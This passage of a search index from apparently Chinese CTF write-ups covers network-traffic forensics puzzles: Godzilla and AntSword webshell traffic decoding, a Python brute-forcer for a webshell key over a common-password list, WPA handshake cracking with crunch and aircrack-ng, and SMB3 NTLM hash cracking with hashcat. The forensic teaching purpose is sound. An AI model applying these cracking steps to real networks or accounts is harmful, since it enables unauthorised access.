<p>\u5982\u679c\u7aef\u53e3\u5f00\u653e\u5219\u56de\u5e94\u4e00\u4e2a FIN,ACK = 1\uff0c\u7531\u6b64\u53ef\u4ee5\u8fc7\u6ee4</p> <p></p> <p>\u70b9\u51fb\u4e0a\u9762\u7edf\u8ba1\u27a1\u4f1a\u8bdd\u62ff\u5230\u6240\u6709\u5f00\u653e\u7aef\u53e3</p> <p></p>"},{"location":"Misc/Chapter5/5-17/","title":"EV3 \u9690\u5199","text":""},{"location":"Misc/Chapter5/5-17/#ev3-\u9690\u5199","title":"EV3 \u9690\u5199","text":"<p>\u6253\u5f00\u56fe\u7247\u63d0\u793a EV3 \u4ee5\u53ca flag \u5934</p> <p></p> <p>\u7f51\u4e0a\u641c\u7d22 EV3 \u63d2\u4ef6\u4e0b\u8f7d\u5bfc\u5165 WireShark \u4e2d</p> <p></p> <p>\u8fc7\u6ee4 EV3 \u534f\u8bae</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b\u7279\u5b9a\u5b57\u8282\u6709\u201c{\u201d\uff0c\u201c}\u201d \u7b49 58 \u4e2a\u5b57\u7b26\u7591\u4f3c flag</p> <p>\u5b83\u4eec\u7684\u524d\u9762\u90fd\u4f1a\u51fa\u73b0 '\uff08'\uff0c'R'\uff0c'6'\uff0c'D' </p> <p></p> <p>\u540c\u65f6\u8fd8\u4f1a\u53d1\u73b0\u6bcf\u4e2a\u6570\u636e\u5305\u7684\u7f16\u53f7\u5206\u522b\u4e3a 10\u300120\u300130 \u7b49</p> <p></p> <p>\u90a3\u4e48 '\uff08'\uff0c'R'\uff0c'6'\uff0c'D' \u4ee3\u8868\u7684\u5c31\u662f\u56db\u7ec4\uff0cValue \u5c31\u662f\u5b57\u7b26\u6392\u5e8f\u987a\u5e8f\uff0c\u56db\u7ec4\u7ec4\u5408\u8d77\u6765\u5c31\u662f flag</p> <p></p>"},{"location":"Misc/Chapter5/5-18/","title":"Web \u76ee\u5f55\u7206\u7834\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-18/#web-\u76ee\u5f55\u7206\u7834\u9690\u5199","title":"Web \u76ee\u5f55\u7206\u7834\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u8fc7\u6ee4 http \u8bf7\u6c42\u53d1\u73b0\u5927\u591a\u6570\u90fd\u662f\u8bf7\u6c42\u7684 Web \u6587\u4ef6\uff0c\u63a8\u6d4b\u662f\u5bf9\u540e\u53f0\u8fdb\u884c\u626b\u63cf</p> <p></p> <p>\u4e0a\u65b9 \u201d\u7edf\u8ba1\u201d \u2192 \u201cHTTP\u201d \u2192 \u201c\u8bf7\u6c42\u201d</p> <p></p> <p>\u8fc7\u6ee4\u72b6\u6001\u7801\u4e3a 200 \u7684\u6570\u636e\u5305\u53d1\u73b0 Base64 \u7f16\u7801\uff0c\u89e3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-19/","title":"\u54e5\u65af\u62c9\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-19/#\u54e5\u65af\u62c9\u6d41\u91cf\u9690\u5199","title":"\u54e5\u65af\u62c9\u6d41\u91cf\u9690\u5199","text":"<p>\u9898\u76ee\u63d0\u793a\u4e86\u54e5\u65af\u62c9\uff0c\u770b\u770b\u5bf9\u54ea\u4e2a\u6587\u4ef6\u8bf7\u6c42\u6700\u591a</p> <p></p> <p>\u4f7f\u7528\u547d\u4ee4\u7b5b\u9009\u51fa\u8fd9\u4e2a\u6587\u4ef6\u7684\u76f8\u5173\u6570\u636e\u5305</p> <pre><code>http.request.uri contains \"aaa.php\"\n</code></pre> <p></p> <p>\u8ffd\u8e2a\u6d41\u53d1\u73b0\u4e86 eval</p> <p></p> <p>\u518d\u5f80\u4e0b\u770b\u53d1\u73b0\u54e5\u65af\u62c9\u663e\u8457\u7279\u5f81</p> <p>Cookie \u540e\u9762\u5e26\u6709\u5206\u53f7 ;</p> <p>\u54cd\u5e94\u5305\u7ed3\u6784\u4f53\u7279\u5f81\u662f</p> <p>md5 \u524d\u5341\u516d\u4f4d + base64 + md5 \u540e\u5341\u516d\u4f4d</p> <p></p> <p>\u627e\u5230 WebShell \u8fde\u63a5\u5bc6\u7801</p> <p></p> <p>\u52a0\u5bc6\u53d6\u524d 16 \u4f4d\u89e3\u5bc6\u7528\uff0c\u540c\u65f6\u4e5f\u662f flag \u524d\u534a\u6bb5</p> <p></p> <p>\u53ea\u53d6\u4e2d\u95f4\u7684\u6765\u8fdb\u884c base64 \u89e3\u7801</p> <p>\u89e3\u7801\u540e\u4e0e\u8fde\u63a5\u7684 Key \u7684 md5 \u503c\u524d 16 \u4f4d\u8fdb\u884c\u6309\u4f4d\u5f02\u6216</p>"},{"location":"Misc/Chapter5/5-2/","title":"WPA \u5bc6\u94a5\u7206\u7834","text":""},{"location":"Misc/Chapter5/5-2/#wpa-\u5bc6\u94a5\u7206\u7834","title":"WPA \u5bc6\u94a5\u7206\u7834","text":"<p>\u6211\u4eec\u77e5\u9053 Wifi \u662f\u57fa\u4e8e WPA \u7684\uff0c\u6700\u5e38\u89c1\u7684 WPA \u914d\u7f6e\u662f WPA-PSK\uff08\u9884\u5171\u4eab\u5bc6\u94a5\uff09</p> <p>WPA-PSK \u57fa\u672c\u4e0a\u610f\u5473\u7740 Wi-Fi \u7f51\u7edc\u6709\u4e00\u4e2a\u5bc6\u7801\uff0c\u7531\u6bcf\u4e2a Wi-Fi \u7f51\u7edc\u5ba2\u6237\u7aef\u5171\u4eab </p> <p>\u53d1\u73b0\u90fd\u662f\u57fa\u4e8e WLAN \u7684 802.11 \u534f\u8bae\u6570\u636e\u5305</p> <p></p> <p>\u9996\u5148\u5206\u6790 WIFI \u7684\u8fde\u63a5\u8fc7\u7a0b</p> <p>\u7b2c\u4e00\u6b65\u662f\u626b\u63cf\u548c\u5173\u8054\uff0c\u4f60\u4f1a\u770b\u5230 Beacon\u5e27\uff0c\u5176\u4e2d\u5305\u542b\u4e86 SSID\u3001MAC \u5730\u5740\u3001\u652f\u6301\u7684\u901f\u7387\u7b49\u4fe1\u606f</p> <p>\u63a5\u7740\u662f Probe Request \u548c Probe Response\u5e27</p> <p>STA \u7528 Probe Request \u6765\u53d1\u73b0 AP</p> <p>AP \u7528 Probe Response \u6765\u54cd\u5e94</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u8ba4\u8bc1\u7684 Authentication \u8bf7\u6c42\u548c\u54cd\u5e94\u5e27</p> <p>\u5b83\u4eec\u5305\u542b\u8ba4\u8bc1\u7b97\u6cd5\u548c\u5e8f\u5217\u7f16\u53f7</p> <p></p> <p>\u6700\u540e\u5c31\u662f\u91cd\u70b9\u5185\u5bb9\uff1a\u56db\u6b21\u63e1\u624b</p> <p>\u56e0\u4e3a\u5b83\u662f\u4f7f\u7528 Eapol Key \u8fdb\u884c\u5c01\u88c5\u4f20\u8f93\u7684\uff0c\u6240\u4ee5\u9700\u8981\u8fc7\u6ee4 Eapol \u534f\u8bae</p> <p></p> <p>\u63e1\u624b\u5305\u662f\u5b8c\u6574\u7684\uff0c\u7834\u89e3\u7684\u8bdd\u9700\u8981\u5bc6\u7801\uff0c\u6839\u636e\u9898\u76ee\u63d0\u793a\u53ef\u4ee5\u751f\u6210\u5b57\u5178\u7206\u7834\uff0c\u4f7f\u7528\u5de5\u5177 Crunch</p> <pre><code>crunch 11 11 -t 1391040%%%% -o passwd.txt\n</code></pre> <p></p> <p>\u6709\u5b57\u5178\u540e\u53ef\u4ee5\u4f7f\u7528\u5f3a\u5927\u7684 Aircrack-ng \u7206\u7834</p> <p></p> <p>\u6210\u529f\u62ff\u5230\u5bc6\u7801</p> <p></p>"},{"location":"Misc/Chapter5/5-20/","title":"\u8681\u5251\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-20/#\u8681\u5251\u6d41\u91cf\u9690\u5199","title":"\u8681\u5251\u6d41\u91cf\u9690\u5199","text":"<p>\u4e00\u770b WebShell \u76f4\u63a5\u8fc7\u6ee4 POST</p> <p></p> <p>\u8ffd\u8e2a\u6d41\u770b\u5230\u4e00\u4e2a\u538b\u7f29\u6587\u4ef6\uff0c\u663e\u793a\u4e3a Hex \u540e\u590d\u5236\u5728 010 \u4e2d\u65b0\u5efa\u5199\u5165</p> <p></p> <p>\u6280\u5de7\uff1a\u5728\u4e4b\u524d\u8fc7\u6ee4\u7684 POST \u4e2d\u8ffd\u8e2a\u6d41\uff0c\u91cd\u70b9\u770b\u770b\u6709\u6ca1\u6709\u4f7f\u7528 WebShell \u5bc6\u7801</p> <p></p> <p>\u89e3\u538b\u7f29\u540e\u62ff\u5230\u6728\u9a6c\u6587\u4ef6\uff0c\u5bc6\u7801\u5c31\u662f n3wst4r</p> <p></p> <p>\u5c06\u5bc6\u7801\u524d\u7684\u53c2\u6570\u89e3\u7801\uff0c\u6ce8\u610f\u8981\u5220\u6389\u5f00\u5934\u4e24\u4e2a\u5b57\u7b26\uff0c\u8fd9\u662f\u8681\u5251\u6d41\u91cf\u7684\u7279\u70b9</p> <p>\u770b\u5230 env \u663e\u793a\u7cfb\u7edf\u7684\u73af\u5883\u53d8\u91cf</p> <p></p> <p>\u5c06\u5176\u5bf9\u5e94\u7684\u54cd\u5e94\u5305\u5185\u5bb9\u89e3\u7801\u62ff\u5230 JAVA \u7248\u672c</p> <p></p> <p>\u7ee7\u7eed\u8ffd\u8e2a\u6d41\u770b\u5230\u67e5\u770b\u4e86\u4e00\u4e2a\u6587\u4ef6</p> <p></p> <p>\u8fd8\u662f\u4e00\u6837\u89e3\u7801\u54cd\u5e94\u5305\uff0c\u6ce8\u610f\u8981\u5220\u6389\u5f00\u5934\u7684\u51e0\u4e2a\u6df7\u6dc6\u5b57\u7b26\u624d\u884c</p> <p>\u89e3\u7801\u7684\u7b2c\u4e00\u884c\u5c31\u662f\u6587\u4ef6\u5185\u5bb9</p> <p></p> <p>\u8fd9\u91cc\u6211\u53c8\u8bd5\u4e86\u4e00\u4e0b\uff0c\u5f00\u5934\u5b57\u7b26\u6570\u91cf\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u9700\u8981\u81ea\u5df1\u624b\u52a8\u5220\u9664\u6d4b\u8bd5</p> <p></p>"},{"location":"Misc/Chapter5/5-21/","title":"SQL \u5e03\u5c14\u76f2\u6ce8\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-21/#sql-\u5e03\u5c14\u76f2\u6ce8\u9690\u5199","title":"SQL \u5e03\u5c14\u76f2\u6ce8\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u4e00\u7247\u7eff</p> <p></p> <p>\u76f4\u63a5\u8fc7\u6ee4 HTTP \u53d1\u73b0\u662f SQL \u5e03\u5c14\u76f2\u6ce8</p> <p></p> <p>\u5728\u5bfc\u51fa HTTP \u5bf9\u8c61\u4e2d\u6309\u5927\u5c0f\u6392\u5217\u62ff\u5230\u6ce8\u5165\u6210\u529f\u7684\u8bed\u53e5</p> <p></p> <p>\u5c06\u5341\u8fdb\u5236\u8f6c ASCII \u7801\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter5/5-22/","title":"\u54e5\u65af\u62c9\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-22/#\u54e5\u65af\u62c9\u6d41\u91cf\u9690\u5199","title":"\u54e5\u65af\u62c9\u6d41\u91cf\u9690\u5199","text":"<p>\u9898\u76ee\u540d\uff1agza_Cracker</p> <p>\u7ed9\u7684\u662f\u4e2a\u6d41\u91cf\u5305\uff0c\u6253\u5f00\u53ea\u6709 HTTP \u548c TCP</p> <p></p> <p>\u76f4\u63a5\u8fc7\u6ee4 HTTP \u518d\u6392\u5217\u627e\u5230\u6728\u9a6c\u6587\u4ef6 ini.php</p> <p></p> <p>\u9898\u76ee\u6709\u63cf\u8ff0\u8bf4\u660e\u4e86\u662f\u54e5\u65af\u62c9\uff0c\u6253\u5f00\u84dd\u961f\u7814\u5224\u5de5\u5177</p> <p>\u9009\u62e9\u89e3\u5bc6 WebShell \u6d41\u91cf\u518d\u9009\u62e9\u54e5\u65af\u62c9 3.x~4.x\uff08\u4e3a\u4ec0\u4e48\u4e0d\u9009 1.x~2.x \u2026\u2026\u56e0\u4e3a\u8fd9\u4e2a\u7248\u672c\u53ea\u6709 Java \u7684\uff09</p> <p>\u9009\u62e9 PHP \u7684</p> <p></p> <p>\u6211\u4eec\u9700\u8981\u627e\u5230\u5bc6\u7801\u53c2\u6570\u4ee5\u53ca\u5bc6\u94a5\u53c2\u6570\u624d\u80fd\u89e3\u5bc6\u6d41\u91cf\u5305</p> <p></p> <p>\u53bb\u8ffd\u8e2a\u6d41\u5148\u62ff\u5230\u5bc6\u7801\u53c2\u6570</p> <p></p> <p>\u627e\u5230\u5bc6\u7801\u53ef\u53c2\u8003\u535a\u5ba2\u94fe\u63a5</p> <p></p> <p>Key \u7684\u53c2\u6570\u6ca1\u6709\u76f4\u63a5\u7ed9\u51fa\uff0c\u603b\u5171\u4e5f\u5c31\u5341\u4e94\u4e2a\u6d41</p> <p>\u5168\u90e8\u7ffb\u5b8c\u53d1\u73b0\u5728\u7b2c 11 \u4e2a\u6709\u7ec4\u6570\u636e</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u6bd4\u5bf9\u7206\u7834\uff08\u539f\u7406\u53c2\u8003\u811a\u672c\u6ce8\u91ca\uff09</p> <p>\u54cd\u5e94\u5305\u5f00\u5934\u6570\u636e\u603b\u662f\u56fa\u5b9a\u7684</p> <p></p> <pre><code>import hashlib\n\n\ndef main():\n    # \u793a\u4f8b\u53d8\u91cf\n    keylist = [\"123456\",\n               \"password\",\n               \"12345678\",\n               \"1234\",\n               \"admin@123\",\n               \"pussy\",\n               \"12345\",\n               \"dragon\",\n               \"qwerty\",\n               \"696969\",\n               \"mustang\",\n               \"letmein\",\n               \"baseball\",\n               \"master\",\n               \"michael\",\n               \"football\",\n               \"shadow\",\n               \"monkey\",\n               \"abc123\",\n               \"pass\",\n               \"fuckme\",\n               \"6969\",\n               \"jordan\",\n               \"harley\",\n               \"ranger\",\n               \"iwantu\",\n               \"jennifer\",\n               \"hunter\",\n               \"fuck\",\n               \"2000\",\n               \"test\",\n               \"batman\",\n               \"trustno1\",\n               \"thomas\",\n               \"tigger\",\n               \"robert\",\n               \"access\",\n               \"love\",\n               \"buster\",\n               \"1234567\",\n               \"soccer\",\n               \"hockey\",\n               \"killer\",\n               \"george\",\n               \"sexy\",\n               \"andrew\",\n               \"charlie\",\n               \"superman\",\n               \"asshole\",\n               \"fuckyou\",\n               \"dallas\",\n               \"jessica\",\n               \"panties\",\n               \"pepper\",\n               \"1111\",\n               \"austin\",\n               \"william\",\n               \"daniel\",\n               \"golfer\",\n               \"summer\",\n               \"heather\",\n               \"hammer\",\n               \"yankees\",\n               \"joshua\",\n               \"Antsw0rd\",\n               \"maggie\",\n               \"biteme\",\n               \"enter\",\n               \"ashley\",\n               \"thunder\",\n               \"cowboy\",\n               \"silver\",\n               \"richard\",\n               \"fucker\",\n               \"orange\",\n               \"merlin\",\n               \"michelle\",\n               \"corvette\",\n               \"bigdog\",\n               \"cheese\",\n               \"matthew\",\n               \"121212\",\n               \"patrick\",\n               \"martin\",\n               \"freedom\",\n               \"ginger\",\n               \"blowjob\",\n               \"nicole\",\n               \"sparky\",\n               \"yellow\",\n               \"camaro\",\n               \"secret\",\n               \"dick\",\n               \"falcon\",\n               \"taylor\",\n               \"111111\",\n               \"131313\",\n               \"123123\",\n               \"bitch\",\n               \"hello\"]\n\n    passphrase = \"Antsword\"\n\n    # \u904d\u5386 keylist\n    for key in keylist:\n        # \u8ba1\u7b97 key \u7684 MD5 \u54c8\u5e0c\u503c\n        md5_key = hashlib.md5(key.encode()).hexdigest()\n\n        # \u622a\u53d6 MD5 \u7684\u524d 16 \u4f4d\n        md5_key_16bit = md5_key[:16]\n\n        # \u5c06 passphrase \u548c md5_key_16bit \u62fc\u63a5\u540e\u8ba1\u7b97\u65b0\u7684 MD5\n        combined = passphrase + md5_key_16bit\n\n        final_md5 = hashlib.md5(combined.encode()).hexdigest()[:16]\n\n        # \u6bd4\u8f83\u7ed3\u679c\u662f\u5426\u7b49\u4e8e\u76ee\u6807\u503c\n        if final_md5 == \"e71f50e9773b23f9\":\n            print(f\"Key is: {key}\")\n            print(f\"16 bit: {md5_key_16bit}\")\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u62ff\u5230\u53c2\u6570\u540e\u5728\u5de5\u5177\u7bb1\u4e2d\u89e3\u5bc6\u54cd\u5e94\u5305\u62ff\u5230\u4e00\u4e32\u7f16\u7801\u5b57\u7b26</p> <p></p> <p>\u5de5\u5177\u68ad\u54c8\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-23/","title":"SMB3 \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-23/#smb3-\u6d41\u91cf\u9690\u5199","title":"SMB3 \u6d41\u91cf\u9690\u5199","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0\u52a0\u5bc6\u7684 SMB3 \u6d41\u91cf</p> <p>SMB3\uff08Server Message Block 3.0\uff09\u662fSMB\u534f\u8bae\u7684\u4e00\u4e2a\u7248\u672c\uff0c\u5e7f\u6cdb\u7528\u4e8e\u6587\u4ef6\u5171\u4eab\u3001\u7f51\u7edc\u6253\u5370\u548c\u5176\u4ed6\u7f51\u7edc\u670d\u52a1</p> <p>SMB3 \u5728 Windows 8 \u548c Windows Server 2012 \u4e2d\u9996\u6b21\u5f15\u5165\uff0c\u5e76\u5f15\u5165\u4e86\u8bb8\u591a\u65b0\u7279\u6027\uff0c\u5305\u62ec\u52a0\u5bc6\u3001\u6301\u4e45\u53e5\u67c4\u3001\u591a\u901a\u9053\u652f\u6301\u7b49</p> <p></p> <p>\u8981\u89e3\u5bc6SMB3\u6d41\u91cf\uff0c\u4f60\u9700\u8981\u4ee5\u4e0b\u4fe1\u606f\u4e4b\u4e00\uff1a</p> <ul> <li>\u4f1a\u8bdd\u5bc6\u94a5\uff1aSMB3 \u52a0\u5bc6\u4f7f\u7528\u7684\u4f1a\u8bdd\u5bc6\u94a5</li> <li>Kerberos\u7968\u636e\uff1a\u5982\u679c SMB3 \u4f7f\u7528 Kerberos \u8ba4\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7 Kerberos \u7968\u636e\u83b7\u53d6\u5bc6\u94a5</li> <li>NTLM\u54c8\u5e0c\uff1a\u5982\u679c SMB3 \u4f7f\u7528 NTLM \u8ba4\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7 NTLM \u54c8\u5e0c\u83b7\u53d6\u5bc6\u94a5</li> </ul> <p>\u9996\u5148\u63d0\u53d6\u54c8\u5e0c\u503c\uff0c\u811a\u672c\u94fe\u63a5</p> <p></p> <p>\u53ea\u6709\u4e00\u4e2a\u7528\u6237\u7684\u54c8\u5e0c\u503c</p> <p></p> <p>hashcat \u7206\u7834\u4e00\u4e0b\u5f97\u5230\u5bc6\u7801 36521478</p> <pre><code>hashcat -a 0 6.txt rockyou.txt\n</code></pre> <p></p> <p>\u5728 WireShark \u4e2d\u8f93\u5165\u5bc6\u7801\u89e3\u5bc6</p> <p></p> <p>\u89e3\u5bc6\u6210\u529f\u53ef\u4ee5\u770b\u5230\u6709\u4e2a secret.doc \u6587\u4ef6</p> <p></p> <p>\u5bfc\u51fa</p> <p></p> <p>\u6253\u5f00\u53d1\u73b0\u6570\u636e\u4e71\u7801\uff0c\u6254\u8fdb WinHex \u4e2d\u53d1\u73b0\u6570\u636e\u9006\u5e8f\u4e86</p> <p>\u9006\u5e8f\u540e\u53c2\u8003\u53d6\u8bc1 2.8 \u8282</p> <p></p>"},{"location":"Misc/Chapter5/5-24/","title":"Ceph \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-24/#ceph-\u6d41\u91cf\u9690\u5199","title":"Ceph \u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0 Ceph \u6d41\u91cf</p> <p></p> <p>Ceph \u6307\u7684\u662f\u4e00\u4e2a\u7edf\u4e00\u7684\u5206\u5e03\u5f0f\u5b58\u50a8\u7cfb\u7edf\uff0c\u9700\u8981\u5de5\u5177 tcpxtract \u6765\u63d0\u53d6</p> <p></p> <p>\u67e5\u770b\u56fe\u7247\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-25/","title":"UDP \u7aef\u53e3\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-25/#udp-\u7aef\u53e3\u6d41\u91cf\u9690\u5199","title":"UDP \u7aef\u53e3\u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0 UDP \u6d41\u91cf Info \u4fe1\u606f\u4e00\u76f4\u5728 3400 \u548c 3401 \u5f98\u5f8a</p> <p></p> <p>\u4f7f\u7528\u811a\u672c\u63d0\u53d6</p> <pre><code># \u4f7f\u7528 cut \u88c1\u53d6\u7aef\u53e3\u7684\u6700\u540e\u4e00\u4f4d\ntshark -r 8868f595665740159650d6e654aadc93.pcap -Tfields -e udp.srcport | cut -c 4\n</code></pre> <p></p> <p>\u6700\u540e\u7f16\u5199\u811a\u672c\u8f6c ASCII \u7801</p> <pre><code>s = \"10110111100110101001011010001100100110101001000110011101100110101000110110011000\"\nflag = ''\n\nfor i in range(len(s)):\n    if s[i] == '0':\n        flag += '1'\n    else:\n        flag += '0'\n\n# \u539f\u59cb\u5b57\u7b26\u4e32\u7ffb\u8bd1\nprint(''.join(chr(int(s[i : i + 8], 2)) for i in range(0, len(s), 8)))\n# \u53d6\u53cd\u7801\u5b57\u7b26\u4e32\u7ffb\u8bd1\nprint(''.join(chr(int(flag[i : i + 8], 2)) for i in range(0, len(flag), 8)))\n</code></pre>"},{"location":"Misc/Chapter5/5-26/","title":"\u6d4b\u4fe1\u9053\u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-26/#\u6d4b\u4fe1\u9053\u6d41\u91cf\u9690\u5199","title":"\u6d4b\u4fe1\u9053\u6d41\u91cf\u9690\u5199","text":"<p>\u6309\u7167\u9898\u76ee\u7ed9\u51fa\u7684\u8981\u6c42\u8f6c\u4e3a\u4e8c\u8fdb\u5236\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter5/5-27/","title":"ICMP Length \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-27/#icmp-length-\u6d41\u91cf\u9690\u5199","title":"ICMP Length \u6d41\u91cf\u9690\u5199","text":"<p>\u770b ICMP \u534f\u8bae\u4e2d Length \u4e0d\u5bf9\u52b2</p> <p></p> <p>\u63d0\u51fa\u6765\u8f6c ASCII \u7801</p> <pre><code>a = [100, 106, 95, 101, 121, 47, 65, 107, 78, 69, 62, 75, 49, 123]\nflag = \"\"\nfor i in a:\n    flag += chr(i + 2)\nprint(flag)\n# flag{1CmPG@M3}\n</code></pre>"},{"location":"Misc/Chapter5/5-28/","title":"RDP \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-28/#rdp-\u6d41\u91cf\u9690\u5199","title":"RDP \u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u53d1\u73b0 RDP \u6d41\u91cf</p> <p></p> <p>\u53e6\u5916\uff0c\u6211\u4eec\u6ce8\u610f\u5230 RDP \u6d41\u91cf\u662f\u901a\u8fc7 SSL \u52a0\u5bc6\u7684\uff0c\u5177\u4f53\u5982\u4e0b\uff1a</p> <p></p> <p>\u7531\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u731c\u6d4b\u6211\u4eec\u9700\u8981\u91cd\u653e RDP \u4f1a\u8bdd\uff0c\u4f46\u8981\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u5bc6\u94a5\u6765\u89e3\u5bc6\u901a\u4fe1\uff0c\u8fd9\u53ef\u80fd\u5728 UDP \u6d41\u4e2d</p> <p>\u8ddf\u8e2a UDP \u6d41\u540e\uff0c\u6211\u4eec\u770b\u5230\u5927\u91cf\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e9b\u6709\u8da3\u7684\u5b57\u7b26\u4e32</p> <p>\u201cTSSecKeySet1\u201d \u548c \u201cMicrosoft Strong Cryptographic Provider\u201d \u770b\u8d77\u6765\u4e0e\u6211\u4eec\u60f3\u8981\u627e\u5230\u7684\u52a0\u5bc6\u5185\u5bb9\u975e\u5e38\u76f8\u4f3c</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u5c06\u6574\u4e2a\u6d41\u8f6c\u50a8\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\u5e76\u5c1d\u8bd5\u5bf9\u5176\u8fdb\u884c\u5206\u6790</p> <p>\u9996\u5148\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u5b83\u662f\u5426\u53ef\u4ee5\u8bc6\u522b\u4e3a\u6587\u4ef6</p> <pre><code>$ file extracted_data.bin\nextracted_data.bin: data\n</code></pre> <p>\u5b83\u4f3c\u4e4e\u6ca1\u6709\u53ef\u8bc6\u522b\u7684\u6807\u5934</p> <p>\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u5728\u5176\u4e0a\u8fd0\u884c Binwalk\uff1a</p> <pre><code>$ binwalk -e extracted_data.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n30            0x1E            Certificate in DER format (x509 v3), header length: 4, sequence length: 2376\n57            0x39            Certificate in DER format (x509 v3), header length: 4, sequence length: 1466\n1546          0x60A           Private key in DER format (PKCS header length: 4, sequence length: 860\n</code></pre> <p>\u73b0\u5728\u5b83\u4f3c\u4e4e\u5305\u542b\u4e00\u4e9b\u8bc1\u4e66\u548c\u4e00\u4e2a\u79c1\u94a5</p> <p>\u5c1d\u8bd5\u5c06\u5355\u4e2a\u6587\u4ef6\u8f6c\u6362\u4e3a\u6211\u4eec\u53ef\u4ee5\u7528 openssl \u8bfb\u53d6\u7684\u7eaf\u6587\u672c\u4f3c\u4e4e\u884c\u4e0d\u901a</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8bfb\u53d6\u4e3a ASN.1 \u6765\u8c03\u8bd5\u5b83</p> <p>ASN.1 \u662f\u4e00\u79cd\u63cf\u8ff0\u7ed3\u6784\u5316\u6570\u636e\u7684\u6807\u51c6\uff0c\u5e38\u7528\u4e8e\u8bc1\u4e66\u3001\u5bc6\u94a5\u7b49\u5bc6\u7801\u5b66\u6570\u636e\u7684\u7f16\u7801</p> <pre><code># asn1parse \u7528\u4e8e\u89e3\u6790 ASN.1 (Abstract Syntax Notation One) \u7f16\u7801\u7684\u6570\u636e\n# -inform \u6307\u5b9a\u8f93\u5165\u6587\u4ef6\u7684\u7f16\u7801\u683c\u5f0f\n# DER (Distinguished Encoding Rules) \u662f ASN.1 \u7684\u4e00\u79cd\u4e8c\u8fdb\u5236\u7f16\u7801\u683c\u5f0f\uff0c\u53e6\u4e00\u79cd\u5e38\u89c1\u683c\u5f0f\u662f PEM\uff08Base64 \u7f16\u7801\u7684\u6587\u672c\u683c\u5f0f\uff09\n$ openssl asn1parse -inform DER -in extracted_data.bin\n    # d=0\uff1a\u5d4c\u5957\u6df1\u5ea6\u4e3a 0\uff08\u9876\u5c42\uff09\uff0chl=4\uff1a\u5934\u90e8\u957f\u5ea6 4 \u5b57\u8282\uff0cl=2467\uff1a\u603b\u957f\u5ea6 2467 \u5b57\u8282\uff0cSEQUENCE\uff1a\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u590d\u5408\u7ed3\u6784\n    0:d=0  hl=4 l=2467 cons: SEQUENCE\n    # \u7248\u672c\u53f7 3\uff1a\u5bf9\u5e94 PKCS#7 \u7684 SignedData \u7248\u672c 1.5\n    4:d=1  hl=2 l=   1 prim: INTEGER           :03\n    # \u5185\u5bb9\u7c7b\u578b\u4e3a pkcs7-data\uff08OID 1.2.840.113549.1.7.1\uff09\uff0c\u8868\u793a\u5c01\u88c5\u7684\u662f\u666e\u901a\u6570\u636e\n    7:d=1  hl=4 l=2399 cons: SEQUENCE\n   11:d=2  hl=2 l=   9 prim: OBJECT            :pkcs7-data\n   22:d=2  hl=4 l=2384 cons: cont [ 0 ]\n   # OCTET STRING\uff1a\u5b9e\u9645\u52a0\u5bc6\u6570\u636e\uff0c\u957f\u5ea6\u4e3a 2380 \u5b57\u8282\n   # HEX DUMP\uff1a\u4ee5 30 82 09 48 \u5f00\u5934\u7684 DER \u6570\u636e\uff0c\u53ef\u80fd\u662f\u5d4c\u5957\u7684 ASN.1 \u7ed3\u6784\uff08\u5982\u52a0\u5bc6\u7684\u8bc1\u4e66\u6216\u5bc6\u94a5\uff09\n   26:d=3  hl=4 l=2380 prim: OCTET STRING      [HEX 